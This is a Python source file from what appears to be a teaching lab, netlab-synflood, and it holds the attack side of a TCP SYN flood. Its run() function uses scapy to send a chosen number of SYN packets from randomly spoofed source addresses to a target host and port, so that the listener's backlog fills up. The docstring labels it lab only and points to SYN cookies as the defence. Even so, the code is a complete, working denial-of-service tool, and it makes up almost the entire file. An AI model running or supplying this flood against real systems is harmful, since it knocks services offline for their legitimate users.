# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-synflood: TCP SYN flood. LAB ONLY.

Floods a listener with half-open connections from spoofed sources so its backlog
fills and legitimate handshakes are refused. SYN cookies (see backlog.py) defeat
this by allocating no state until the ACK returns.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    print(f"[*] SYN flooding {args.dst}:{args.dport} with {args.count} spoofed SYNs")
    sent = 0
    for _ in range(args.count):
        pkt = s.IP(src=s.RandIP(), dst=args.dst) / s.TCP(
            sport=s.RandShort(), dport=args.dport, flags="S", seq=s.RandInt()
        )
        s.send(pkt, verbose=0)
        sent += 1
        if sent % 1000 == 0:
            verdict("ALERT", f"{sent} SYNs sent")
    verdict("ALERT", f"done: {sent} half-open attempts")
    return 0
